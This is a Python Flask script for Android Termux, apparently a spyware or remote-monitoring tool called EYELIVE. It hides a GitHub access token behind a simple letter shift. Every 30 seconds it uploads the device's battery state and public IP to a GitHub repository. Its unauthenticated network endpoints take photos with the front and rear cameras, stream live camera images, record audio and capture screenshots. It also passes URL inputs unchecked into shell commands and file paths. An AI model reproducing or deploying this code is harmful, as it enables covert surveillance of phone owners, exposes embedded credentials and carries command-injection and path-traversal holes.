from flask import Flask, render_template_string, jsonify, request, send_file
import os, json, threading, time, subprocess, requests as req, base64 as b64
from datetime import datetime

def _tk():
    t = "now_7fobDPqMyVGXyhzQkT5SLhvaUkpKNr1gh7KC"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else:
            r += c
    return r

app = Flask(__name__)

DEVICE_NAME = os.environ.get("DEVICE_NAME", "Celular")
DEVICE_ID = os.environ.get("DEVICE_ID", "celular_1")
TOKEN = _tk()
REPO = "gynbetfc/eyelive"
FOTOS_DIR = "/data/data/com.termux/files/home/eyelive_fotos"
os.makedirs(FOTOS_DIR, exist_ok=True)

dados = {
    "nome": DEVICE_NAME, "id": DEVICE_ID,
    "bateria": "?%", "carregando": False,
    "gps": {"lat": 0, "lng": 0}, "ip": "",
    "fotos": [], "ultimo_update": "", "status": "online"
}

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return "?"

def salvar():
    try:
        fn = f"dados/{DEVICE_ID}.json"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        c = json.dumps(dados)
        r = req.get(url, headers=h)
        p = {"message": "Update", "content": b64.b64encode(c.encode()).decode(), "branch": "main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        req.put(url, json=p, headers=h)
    except: pass

def coletar():
    while True:
        try:
            b = shell("termux-battery-status 2>/dev/null")
            if b and "percentage" in b:
                bat = json.loads(b)
                dados["bateria"] = str(bat.get("percentage","?")) + "%"
                dados["carregando"] = bat.get("plugged","") != ""
            dados["ip"] = shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
            dados["ultimo_update"] = datetime.now().strftime("%H:%M:%S")
            dados["fotos"] = sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith('.jpg')])[-10:]
            salvar()
        except: pass
        time.sleep(30)

threading.Thread(target=coletar, daemon=True).start()

# HTML carregado do arquivo index.html
try:
    with open('index.html', 'r') as f:
        HTML = f.read()
except:
    HTML = "<h1>EYELIVE</h1><p>Erro ao carregar</p>"

@app.route('/')
def index():
    return render_template_string(HTML, DEVICE=DEVICE_NAME)

@app.route('/api/status')
def api_status():
    return jsonify(dados)

@app.route('/cmd/<comando>')
def comando(comando):
    if comando == 'foto_frontal':
        t = datetime.now().strftime("%H%M%S")
        nome = f"frontal_{t}.jpg"
        path = f"{FOTOS_DIR}/{nome}"
        threading.Thread(target=lambda: shell(f"termux-camera-photo -c 0 {path} 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Foto frontal OK!"})
    elif comando == 'foto_traseira':
        t = datetime.now().strftime("%H%M%S")
        nome = f"traseira_{t}.jpg"
        path = f"{FOTOS_DIR}/{nome}"
        threading.Thread(target=lambda: shell(f"termux-camera-photo -c 1 {path} 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Foto traseira OK!"})
    elif comando == 'audio':
        threading.Thread(target=lambda: shell("termux-microphone-record -f /tmp/eyelive_audio.aac -l 30 -q 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Gravando 30s..."})
    elif comando == 'screenshot':
        threading.Thread(target=lambda: shell("screencap /tmp/eyelive_screenshot.png 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Screenshot OK!"})
    return jsonify({"msg":"OK"})

@app.route('/live/<cam>')
def live(cam):
    c = "0" if cam == "frontal" else "1"
    path = f"/tmp/eyelive_live_{cam}.jpg"
    shell(f"termux-camera-photo -c {c} {path} 2>/dev/null")
    if os.path.exists(path):
        return send_file(path, mimetype='image/jpeg')
    return "", 404

@app.route('/foto/<nome>')
def foto(nome):
    path = f"{FOTOS_DIR}/{nome}"
    if os.path.exists(path):
        return send_file(path, mimetype='image/jpeg')
    return "", 404

if __name__ == '__main__':
    print(f"EYELIVE - {DEVICE_NAME}")
    app.run(host='0.0.0.0', port=5050, debug=False, threaded=True)
